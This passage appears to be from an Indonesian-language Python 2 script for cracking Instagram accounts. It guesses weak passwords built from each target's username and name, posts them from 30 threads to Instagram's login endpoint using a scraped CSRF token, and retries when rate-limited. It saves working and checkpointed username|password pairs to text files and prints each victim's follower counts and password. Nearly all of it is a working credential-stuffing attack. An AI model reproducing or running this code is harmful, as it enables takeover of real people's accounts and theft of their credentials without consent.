)

def proses():
	print ('\n%s [%s++%s] Account %s[OK] %sSaved In %s=> %s%s'%(B,J,B,H,O,M,H,"sucses.txt"));jeda(0.2)
	print ('%s [%s++%s] Account %s[%sCP%s]%s Saved In %s=> %s%s'%(B,J,B,M,K,M,O,M,K,"cheekpoint.txt"));jeda(0.2)
	#print (" FOLLOW GITHUB https://github.com/mrjeeck")
	jeeck("\n \033[0;00m[\033[0;36m++\033[0;00m]\033[0;00m ikuti arahanya biar kagak bingung\n\n ")
def crack2(user, pwx):
	global looping, loping
	c_jeeckxnano_ = len(pwx)
	for pas in pwx:
		if looping != 1:
			pass
		else:
			if len(status_foll) != 1:
				print "\r\033[0;36mCracking %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
				sys.stdout.flush()
				c_jeeckxnano_ -= 1
			else:
				pass
		try:
			if user in ok or user in cp:
				break
			pw = pas.lower()
			try:
				headerz = {"User-Agent": user_agentz_api}
				with requests.Session() as ses:
					urll = "https://www.instagram.com/"
					data = ses.get(urll, headers=headerz).content
					tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
				header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
						 }
				param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
						}
			except:
				header = {}
				param = {}
				pass
			with requests.Session() as ses:
				url = "https://www.instagram.com/accounts/login/ajax/"
				respon = ses.post(url, data=param, headers=header)
				data = json.loads(respon.content);jeda(00.1)
				
				if "checkpoint_url" in str(data):
					xncode = "ANJAYSESI"
					ingfo(user, pw, xncode)
					with open("cheekpoint.txt", "a") as simpan:
						simpan.write(" [ANJAYSESI] "+user+"|"+pw+"\n")
					cp.append(user)
					break
				elif "userId" in str(data):
					jeeckganz = "GGNGAKTUH"
					if len(status_foll) != 1:
						ingfo(user, pw, jeeckganz)
						with open("sucses.txt", "a")as simpan:
							simpan.write(" [GGNGGAKTUH] "+user+"|"+pw+"\n")
						ok.append(user)
					
					break
				elif "Please wait" in str(data):
					print ("\r%s [+] On Airplane 4 Seconds Bro  "%(M)),
					looping+=1
					sys.stdout.flush()
					pwx = [pw]
					crack2(user, pwx)
					loping -= 1
				else:
					looping = 1
					pass
		except requests.exceptions.ConnectionError:
			print ("\r%s [+] Your Off conectionts "%(M)),
			sys.stdout.flush()
			looping+=1
			pwx = [pw]
			crack2(user, pwx)
			loping -= 1
		except:
			looping = 1
			pass
	loping+=1
None

def passxnxx():
	with ThreadPoolExecutor(max_workers=30) as log:
		for ro in mi:
			try:
				_jeeckxnano_ = []
				_r_ = ro.encode("utf-8")
				_o_ = _r_.split("|")[0]
				_m_ = _r_.split("|")[1]
				_i_ = _m_.split()
				if len(cr) != 1:
					if len(_o_) >= 6:
						_jeeckxnano_.append(_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_jeeckxnano_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_jeeckxnano_.append(_m_)
						else:
							_jeeckxnano_.append(_i_[0]+"123")
							if len(_i_) >= 2:
								_jeeckxnano_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_jeeckxnano_.append(_m_)
					else:
						_jeeckxnano_.append(_o_+_o_)
						if len(_i_[0]) <= 2:
							if len(_i_) >= 2:
								_jeeckxnano_.append(_i_[0]+_i_[1])
							if len(_m_) >= 6:
								_jeeckxnano_.append(_m_)
						else:
							if len(_i_) >= 2:
#....lan3
								_jeeckxnano_.append(_i_[0]+_i_[1])
							_jeeckxnano_.append(_i_[0]+"123")
							if len(_m_) >= 6:
								_jeeckxnano_.append(_m_)
				else:
					_jeeckxnano_.append(_i_[0]+"123")
					_jeeckxnano_.append(_i_[0]+"12345")
					_jeeckxnano_.append(_o_)
				log.submit(crack2, _o_, _jeeckxnano_)
			except: pass
	exit("%s• finished"%(H))
def ingfo(user, pw, status):
	try:
		global idg, pengikut, mengikuti
		dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user), headers={"User-Agent": user_agentz})
		dta_ = dta.json()["graphql"]["user"]
		nama = dta_["full_name"].encode("utf-8")
		idg = dta_["id"]
		pengikut = dta_["edge_followed_by"]["count"]
		mengikuti = dta_["edge_follow"]["count"]
		if status == "Berhasil":
			print ("\r%s [√] Berhasil                   "%(H))
			print ("\r%s [√] Nama akun %s> %s%s          "%(H,M,H,str(nama)))
			print ("\r%s [√] Pengikut  %s> %s%s          "%(H,M,H,str(pengikut)))
			print ("\r%s [√] Mengikuti %s> %s%s          "%(H,M,H,str(mengikuti)))
			print ("\r%s [√] Username  %s> %s%s          "%(H,M,H,user))
			print ("\r%s [√] Password  %s> %s%s          \n"%(H,M,H,pw))
		elif status == "Checkpoint":
			print ("\r%s [×] Checkpoint                 "%(K))
			print ("\r%s [×] Nama akun %s> %s%s          "%(K,M,K,str(nama)))
			print ("\r%s [×] Pengikut  %s> %s%s          "%(K,M,K,str(pengikut)))
			print ("\r%s [×] Mengikuti %s> %s%s         "%(K,M,K,str(mengikuti)))
			print ("\r%s [×] Username  %s> %s%s         "%(K,M,K,user))
			print ("\r%s [×] Password  %s> %s%s          \n"%(K,M,K,pw))
		else:
			pass
	except: pass
None
loping= 1

if __name__ == '__main__':
	os.system("git pull")
	folder()
	menu()

if __name__=="__main__":
    os.system("git pull")
    os.system("touch login.txt")
    ___chek______jeeck___tilikihasile______jeeck___()
    menu()
